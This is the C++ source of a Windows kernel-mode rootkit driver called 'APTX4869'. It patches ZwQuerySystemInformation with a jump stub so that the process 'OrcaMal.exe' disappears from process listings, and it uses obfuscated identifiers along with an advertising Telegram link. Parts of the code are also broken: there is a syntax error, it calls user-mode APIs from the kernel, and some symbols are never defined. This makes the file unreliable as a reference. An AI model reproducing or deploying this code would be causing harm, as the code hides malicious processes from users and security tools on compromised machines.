//Telegram : https://t.me/I0xp17j8

#include "APTX4869.h"
#include "pch.h"

extern "C" NTSTATUS APTX4869BN()
{
    NTSTATUS status = STATUS_SUCCESS;

    KdPrint((
        "    _    ____ _______  ___  _    ___   __   ___  \n"
        "   / \\  |  _ \\_   _\\ \\/ / || |  ( _ ) / /_ / _ \\ \n"
        "  / _ \\ | |_) || |  \\  /| || |_ / _ \\| '_ \\ (_) |\n"
        " / ___ \\|  __/ | |  /  \\|__   _| (_) | (_) \\__, |\n"
        "/_/   \\_\\_|    |_| /_/\\_\\ |_|  \\___/ \\___/  /_/ \n"
        "              Welcome to APTX4869 Rootkit\n";

    ));

    return status;
}

LPVOID RtktProcedureAddress;
SIZE_T CorruptBytes;
unsigned char APTX4869FBDDNOPC[16] = { 0 };

unsigned char APTX4869OPC[32] = {
    0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0xff, 0xe0, 0x90, 0x90, 0x90, 0x90,
    0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0xff, 0xe0, 0x90, 0x90, 0x90, 0x90
};

UNICODE_STRING APTX4869FBDDNPROC = RTL_CONSTANT_STRING(L"OrcaMal.exe");

extern "C" NTSTATUS
NTAPI APTX4869NtQuerySystemInformation(
     SYSTEM_INFORMATION_CLASS SystemInformationClass,
     PVOID SystemInformation,
     ULONG SystemInformationLength,
     PULONG ReturnLength 
);

extern "C" NTSTATUS
NTAPI APTX4869NtQuerySystemInformationHook(
     SYSTEM_INFORMATION_CLASS SystemInformationClass,
     PVOID SystemInformation,
     ULONG SystemInformationLength,
     PULONG ReturnLength 
);

NTSTATUS APTX4869NtQuerySystemInformationHook(
     SYSTEM_INFORMATION_CLASS SystemInformationClass,
     PVOID SystemInformation,
     ULONG SystemInformationLength,
     PULONG ReturnLength 
) {
    NTSTATUS jUGTUbshuIYTFSssjhsdgqydttsYSTAHyutHisRSLT = 0;

    PSYSTEM_PROCESS_INFORMATION InfernalProcessInfo = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;

    if (!WriteProcessMemory(PsGetCurrentProcess(), RtktProcedureAddress, APTX4869FBDDNOPC, sizeof(APTX4869OPC), &CorruptBytes))
        return STATUS_UNSUCCESSFUL;

    jUGTUbshuIYTFSssjhsdgqydttsYSTAHyutHisRSLT = APTX4869ZwQuerySystemInformation(SystemInformationClass, InfernalProcessInfo, SystemInformationLength, ReturnLength);

    if (!WriteProcessMemory(PsGetCurrentProcess(), RtktProcedureAddress, APTX4869OPC, sizeof(APTX4869OPC), &CorruptBytes))
        return STATUS_UNSUCCESSFUL;

    if (SystemInformationClass == SystemProcessInformation) {
        PSYSTEM_PROCESS_INFORMATION AccursedNextEntry = InfernalProcessInfo;

        while (InfernalProcessInfo->NextEntryOffset) {
            AccursedNextEntry = (PSYSTEM_PROCESS_INFORMATION)((LPBYTE)AccursedNextEntry + AccursedNextEntry->NextEntryOffset);

            if (AccursedNextEntry->NextEntryOffset == 0) {
                InfernalProcessInfo->NextEntryOffset = 0;
            }
            if (RtlEqualUnicodeString(&AccursedNextEntry->ImageName, &APTX4869FBDDNPROC, TRUE)) {
                InfernalProcessInfo->NextEntryOffset += AccursedNextEntry->NextEntryOffset;
            }

            InfernalProcessInfo = (PSYSTEM_PROCESS_INFORMATION)((LPBYTE)InfernalProcessInfo + InfernalProcessInfo->NextEntryOffset);
        }
    }
    return jUGTUbshuIYTFSssjhsdgqydttsYSTAHyutHisRSLT;
}

int IVKIIVKqKVIkMVKqKVIkMqIVIVKqKVIkMKqKVIkMKVIkM() {
    RtktProcedureAddress = MmGetSystemRoutineAddress(&DarkZwQuerySystemInformation);

    if (!RtktProcedureAddress)
        return -1;

    void* qsihKEjhdqhuzbdcsqPH = &APTX4869NtQuerySystemInformationHook;

    if (!RtlCopyMemory(APTX4869FBDDNOPC, RtktProcedureAddress, sizeof(APTX4869OPC)))
        return -1;

    RtlCopyMemory(APTX4869OPC + 2, &qsihKEjhdqhuzbdcsqPH, sizeof(qsihKEjhdqhuzbdcsqPH));

    if (!RtlCopyMemory(RtktProcedureAddress, APTX4869OPC, sizeof(APTX4869OPC)))
        return -1;

    return 0;
}

extern "C" NTSTATUS
RtKtDriverInitiation(
    _In_ PDRIVER_OBJECT   SinisterDriverObject,
    _In_ PUNICODE_STRING  CursedRegistryPath
) {
    UNREFERENCED_PARAMETER(CursedRegistryPath);

    SinisterDriverObject->DriverUnload = UnleashMalevolence;

    if (IVKIIVKqKVIkMVKqKVIkMqIVIVKqKVIkMKqKVIkMKVIkM() != 0) 
	{
        KdPrint(("[-] Failed to initialize rootkit. Cleanup required.\n"));
		return STATUS_UNSUCCESSFUL;
    }

KdPrint(("[+] APTX4869 Rootkit initialized successfully.\n"));
    return STATUS_SUCCESS;
}

extern "C" VOID UnleashMalevolence(
    _In_ PDRIVER_OBJECT SinisterDriverObject
) {
    UNREFERENCED_PARAMETER(SinisterDriverObject);

KdPrint(("[+] APTX4869 Rootkit Unleashed\n"));
}
